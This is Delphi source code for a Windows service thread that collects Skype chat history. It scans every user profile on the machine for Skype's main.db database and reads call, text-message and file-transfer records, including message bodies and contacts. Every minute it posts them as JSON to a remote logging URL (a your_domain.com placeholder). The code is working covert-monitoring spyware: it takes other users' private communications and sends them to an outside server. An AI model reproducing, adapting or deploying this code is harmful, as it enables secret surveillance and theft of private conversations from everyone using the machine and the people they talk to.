unit srvThread;

interface

{$I OVERBYTEICSDEFS.INC}

uses
  Classes,OverbyteIcsHttpProt,SvcMgr,JSON,SyncObjs;

type
  THttpProc = procedure (j:TJSONarray) of object;
  srvSkypeLog = class(TThread)
  private
    { Private declarations }
    srv:TService;
    FHttpCli:THttpCli;
    FTermEvent:TEvent;
    mem_send,mem_input:TMemoryStream;
    js_obj:TJSONlist;
    Procedure EnumUser;
    procedure EnumSkype(Const UserAcc:WideString);
    procedure testDB(dir,db_name:WideString);
  protected
    http_active:Boolean;
    procedure Execute; override;
    procedure HttpRequestDone(Sender: TObject; ReqType: THttpRequest; ErrorCode: Word);
    procedure log_begin(json:TJSONarray);
    procedure get_pos(dir,db_name:WideString);
  Public
    constructor Create(Srv_obj:TService);
    Destructor Destroy; Override;
    procedure Stop;
  end;

implementation

Uses Windows,SysUtils,Messages,ASGSQLite3,SkypeHistory,WinUser,TntSysUtils,DB;

Function GetProfilesDirectoryW(ProfilesDir:PWideChar;Size:PDWORD):LongBool; Stdcall; External 'userenv.dll';

Const
  AppData1 = '\Application Data\Skype\';
  CHECK_TIME = 60000; // milliseconds
  WEB_LOG = 'http://www.your_domain.com/skype/log.php';
  WEB_POS = 'http://www.your_domain.com/skype/log_pos.php?nick=';

var
  http_proc:THttpProc;
  LenProfile:DWORD = 1;
  UserProfile:Array[0..512] of WideChar;
  Profile:WideString;
  last_chat,last_file:Cardinal;

function URLEncode(Const Src: string): string;
const
  Hex : Array[0..15] of Char = ('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
var
  i : Integer;
  Buf, P: PChar;
  ch: Char;
begin
  Result := '';
  GetMem(Buf, (Length(src) * 3) + 3);
  try
    P := Buf;
    for i := 1 to Length(src) do begin
      ch := src[i];
      if (ch in ['a'..'z']) or
         (ch in ['A'..'Z']) or
         (ch in ['0'..'9']) or
         (ch in ['-','_','.','!','~','*','''','(',')']) then
      begin
        P^ := src[i];
        Inc(P);
      end
      else
      begin
        { handcoded IntToHex to avoid string handling overhead for each character }
        P^ := '%';
        Inc(P);
        P^ := Hex[((Ord(ch) shr 4) and $0f)];
        Inc(P);
        P^ := Hex[Ord(ch) and $0f];
        Inc(P);
      end;
    end; { for }
    SetString(Result, Buf, P - Buf);
  finally
    FreeMem(Buf);
  end;
end;

Constructor srvSkypeLog.Create(Srv_obj:TService);
Begin
  FreeOnTerminate:=False;
  Inherited Create(True);
  srv:=Srv_obj;
  FHttpCli:=THttpCli.Create(Nil);
  FTermEvent:=TEvent.Create(nil,True,False,'SkypeTermEvent');
  mem_send:=TMemoryStream.Create;
  mem_input:=TMemoryStream.Create;
  js_obj:=TJSONlist.Create;
  with FHttpCli do
  begin
    RcvdStream:=mem_input;
    SendStream:=mem_send;
    OnRequestDone:=HttpRequestDone;
    http_proc:=Nil;
    URL:=WEB_LOG;
    ContentTypePost:='application/x-www-form-urlencoded';
  end;
  LenProfile:=Length(UserProfile);
  if GetProfilesDirectoryW(UserProfile,@LenProfile) then Profile:=Copy(UserProfile,1,LenProfile)+'\';
end;

Destructor srvSkypeLog.Destroy;
Begin
  {$IFDEF DEBUG}
  OUtputDebugString('thread destroyed');
  {$ENDIF}
  If Assigned(FHttpCli) then
  begin
    FHttpCli.Terminated:=True;
    FreeAndNil(FHttpCli);
  end;
  mem_send.Free;
  mem_input.Free;
  js_obj.free;
  FTermEvent.Free;
  Inherited;
end;

procedure srvSkypeLog.Stop;
begin
  Terminate;
  FTermEvent.SetEvent;
end;

procedure srvSkypeLog.Execute;
var
  z:AnsiString;
begin
  {$IFDEF DEBUG}
  OutputDebugString('thread start execution');
  {$ENDIF}
  while not terminated do
  begin
    // find all Main.DB files
    if Profile<>'' then
    begin
      With FHttpCli Do
      begin
        EnumUser;
        mem_send.Clear;
          {$IFDEF DEBUG}
          OutputDebugString(PAnsiChar(IntToStr(js_obj.count)));
          {$ENDIF}
        if js_obj.Count<>0 then
        begin
          z:=js_obj.JsonText;
          mem_send.WriteBuffer(z[1],Length(z));
          {$IFDEF DEBUG}
          OutputDebugString('JSON created');
          {$ENDIF}
        end;
        SendStream.Seek(0,0);
        If mem_send.Size<>0 then
        try
          URL:=WEB_LOG;
          http_proc:=Nil;
          PostASync;
          {$IFDEF DEBUG}
          OutputDebugString('POST made');
          {$ENDIF}
          http_active:=True;
          while http_active and not Terminated and not Self.Terminated do ProcessMessage;
          {$IFDEF DEBUG}
          OutputDebugString(PAnsiChar('end loop'));
          {$ENDIF}
          if http_active then Terminated:=True;
        Except
          on E:EHttpException Do OutputDebugString(PAnsiChar('HTTP failed, error = '+E.Message));
        End;
        {$IFDEF DEBUG}
        OutputDebugString('tracing done');
        {$ENDIF}
      End;
    End;
    {$IFDEF DEBUG}
    OutputDebugString('sleep start');
    {$ENDIF}
    FTermEvent.WaitFor(CHECK_TIME);
    {$IFDEF DEBUG}
    OutputDebugString('sleep end');
    {$ENDIF}
  end;
  {$IFDEF DEBUG}
  OutputDebugString('thread finished');
  {$ENDIF}
end;

Procedure srvSkypeLog.EnumUser;
Begin
  js_obj.Clear;
  getUsers(EnumSkype);
end;

Procedure srvSkypeLog.EnumSkype(Const UserAcc:WideString);
var
  rec_dir:TSearchRecW;
  acc,fn:Widestring;
Begin
  acc:=Profile+UserAcc+AppData1;
  rec_dir.ExcludeAttr:=Not faDirectory;
  if WideFindFirst(acc+'*',faDirectory,rec_dir)=0 Then
  Repeat
    If rec_dir.Name[1]<>'.' then
    begin
      fn:=acc+rec_dir.Name+'\main.db';
      if FileExists(fn) then
      begin
        get_pos(rec_dir.Name,fn);
        testDB(rec_dir.Name,fn);
      end;
    End;
  Until WideFindNext(rec_dir)<>0;
  WideFindClose(rec_dir);
end;

procedure srvSkypeLog.get_pos(dir,db_name:WideString);
begin
  {$IFDEF DEBUG}
  OutputDebugStringW(PWideChar('get Position for File, Msg in DB = '+dir));
  {$ENDIF}
  With FHttpCli Do
  begin
    mem_send.Clear;
    mem_input.Clear;
    try
      URL:=WEB_POS+URLencode(UTF8Encode(dir));
      http_proc:=log_begin;
      GetASync;
      {$IFDEF DEBUG}
      OutputDebugString('GET made');
      {$ENDIF}
      http_active:=True;
      while http_active and not Terminated and not Self.Terminated do ProcessMessage;
      {$IFDEF DEBUG}
      OutputDebugString(PAnsiChar('end GET loop'));
      {$ENDIF}
      if http_active then Terminated:=True;
    Except
      on E:EHttpException Do OutputDebugString(PAnsiChar('HTTP failed, error = '+E.Message));
    End;
    {$IFDEF DEBUG}
    OutputDebugString('Got cur position');
    {$ENDIF}
  End;
end;

Procedure srvSkypeLog.testDB(dir,db_name:WideString);
Var
  js2:TJSONobject;
  s:WideString;
Begin
  {$IFDEF DEBUG}
  OutputDebugStringW(PWideChar('test DB = '+dir));
  {$ENDIF}
  with TSkypeLogger(srv).sqlDB1 Do
  begin
    Database:=db_name;
    try
      Open;
    Except
      on E:Exception do
      Begin
        OutputDebugString(PAnsiChar('DB open failed, error = '+E.Message));
        Exit;
      End;
    End;
  end;
  (*
  with TSkypeLogger(srv).sqlQuery1 Do
  begin
    try
      Params[0].AsInteger:=last_file;
      Open;
    Except
      on E:EDatabaseError Do
      Begin
        OutputDebugString(PAnsiChar('SQL_1 failed, error = '+E.Message));
        Exit;
      End;
    End;
    {$IFDEF DEBUG}
    OutputDebugString('SQL file transfers');
    {$ENDIF}
    First;
    While Not eof Do
    begin
        // table "Transfers"
        // column "type" = 1 (incoming), 2 (outgoing)
        // column "partner_handle" = skype account
        // column "partner_dispname" = custom display nickname
        // column "failurereason" <> NULL, if error
        // column "starttime", "finishtime" = UNIX timestamp
        // column "filepath" = path + file name
        // column "filesize" = integer
      js2:=Nil;
      try
        js2:=TJSONobject.Create;
        js2.Add('nick',dir);
        js2.Add('file_id',Fields[0].AsInteger); // ID
        js2.Add('stamp',Fields[1].AsString); // StartTime
        js2.Add('last_stamp',Fields[7].AsInteger); // StartTime
        if Fields[2].AsInteger=1 Then // Type
        begin
          // incoming file
          js2.Add('from',UTF8Decode(Fields[3].AsString)); // partner_handle
          js2.Add('to',dir);
        End
        Else
        Begin
          // outgoing file
          js2.Add('to',UTF8Decode(Fields[3].AsString)); // partner_handle
          js2.Add('from',dir);
        end;
        if Fields[4].AsInteger=0 Then s:='' Else s:='CANCELLED '; // Failure
        s:=s+'filename = "'+UTF8Decode(Fields[5].AsString)+'" ('+Fields[6].AsString+' bytes)'; // FilePath, FileSize
        js2.Add('body',s);
        {$IFDEF DEBUG}
        OutputDebugStringW(PWideChar(s));
        {$ENDIF}
      Except
        on E:Exception do
        begin
          FreeAndNil(js2);
          {$IFDEF DEBUG}
          OutputDebugString(PAnsiChar('JSON_1 error = '+E.Message));
          {$ENDIF}
        end;
      End;
      if Assigned(js2) then js_obj.Add(js2);
      Next;
    End;
    Close;
  End;
  *)
  with TSkypeLogger(srv).sqlQuery3 Do
  begin
    try
      SQL.Text:='SELECT id, datetime(timestamp,''unixepoch'') start, type, author,dialog_partner, body_xml, timestamp'
        +' FROM messages WHERE type IN (30,61,68) AND body_xml IS NOT NULL AND timestamp>'+IntToStr(last_chat)
        +' ORDER BY id LIMIT 50';
      Open;
      // type 30 = call start
      // type 61 = text message
      // type 68 = file transfer
    Except
      on E:EDatabaseError Do
      Begin
        OutputDebugString(PAnsiChar('SQL_3 failed, error = '+E.Message));
        Exit;
      End;
    End;
    {$IFDEF DEBUG}
    OutputDebugString('SQL messages');
    OutputDebugString(PAnsiChar(IntToStr(last_chat)));
    OutputDebugString(PAnsiChar(IntToStr(RecordCount)));
    {$ENDIF}
    First;
    While Not eof Do
    begin
      js2:=Nil;
      try
        js2:=TJSONobject.Create;
        js2.Add('nick',dir);
        if Fields[2].AsInteger=61 Then js2.Add('chat_id',Fields[0].AsInteger) // ID - convert HTML entities
          Else js2.Add('file_id',Fields[0].AsInteger); // ID - do not convert HTML entities
        js2.Add('stamp',Fields[1].AsString);
        js2.Add('last_stamp',Fields[6].AsInteger); // TimeStamp
        if (Fields[3].AsString=dir) Then
        begin
          js2.Add('from',dir); // Author
          js2.Add('to',UTF8Decode(Fields[4].AsString)); // Dialog_partner
        End
        Else
        Begin
          js2.Add('from',UTF8Decode(Fields[3].AsString)); // Author
          js2.Add('to',dir); // Recipient
        end;
        js2.Add('body',UTF8Decode(Fields[5].asString)); // Body_XML
        {$IFDEF DEBUG}
        s:='skype chat ('+Fields[0].AsString + ' = ' + Fields[6].AsString
          +','+js2.Field['from'].Value
          +','+js2.Field['to'].Value+') = '+js2.Field['body'].Value;
        OutputDebugStringW(PWideChar(s));
        {$ENDIF}
      Except
        on E:Exception do
        begin
          FreeAndNil(js2);
          {$IFDEF DEBUG}
          OutputDebugString(PAnsiChar('JSON_2 error = '+E.Message));
          {$ENDIF}
        end;
      End;
      if Assigned(js2) then js_obj.Add(js2);
      Next;
    End;
    Close;
  End;
        // table "Chats"
        // column "chatname" = same as in MESSAGES
        // column "type" = 2(chat), 4(call)
        // column "participants" = space delimited skype accounts
        // column "dialog_partner" = valid for type 2

        // datetime(timestamp, 'unixepoch')  as date
  TSkypeLogger(srv).sqlDB1.Close;
  {$IFDEF DEBUG}
  OutputDebugString(PAnsiChar('DB close = '+IntToStr(js_obj.Count)));
  {$ENDIF}
end;

Procedure srvSkypeLog.HttpRequestDone(Sender: TObject; ReqType: THttpRequest; ErrorCode: Word);
Var
  json:TJSONarray;
  Buf:PAnsiChar;
Begin
  { Check status }
  if ErrorCode <> 0 then OutputDebugString(PAnsiChar('HTTP failed, error #'+IntToStr(ErrorCode)))
  Else if FHttpCli.StatusCode<>200 Then OutputDebugString(PAnsiChar('HTTP status = '+FHttpCli.ReasonPhrase))
  else
  Begin
    json:=Nil;
    if FHttpCli.RcvdCount<>0 Then
    Begin
      mem_input.Position:=0;
      Buf:=mem_input.Memory;
      (Buf+fhttpcli.RcvdCount)^:=#0;
      {$IFDEF DEBUG}
      OutputDebugString('Parsing JSON');
      {$ENDIF}
      Try
        json:=ParseJSON(Buf);
        {$IFDEF DEBUG}
        OutputDebugString(PAnsiChar('JSON parsed = '+Buf));
        {$ENDIF}
      Except
        on E:exception do OutputDebugString(PAnsiChar('JSON error = '+E.Message));
      End;
      if Assigned(json) and Assigned(http_proc) Then http_proc(json);
    end;
  end;
  {$IFDEF DEBUG}
  OutputDebugString('HTTP request done');
  {$ENDIF}
  { Break message loop we called from the execute method }
  //FHttpCli.PostQuitMessage;
  http_active:=False;
end;

Procedure srvSkypeLog.log_begin(json:TJSONarray);
var
  js:TJSONobject;
begin
  {$IFDEF DEBUG}
  OutputDebugString('Log Begin');
  {$ENDIF}
  js:=TJSONobject(json);
  try
    last_chat:=JS.field['last_chat'].Value;
    last_file:=js.Field['last_file'].Value;
  Except
    on E:exception do OutputDebugString(PAnsiChar('JSON error = '+E.Message));
  End;
  {$IFDEF DEBUG}
  OutputDebugString(PAnsiChar('Last chat = '+IntToStr(last_chat)+', last file = '+IntToStr(last_file)));
  {$ENDIF}
end;

end.
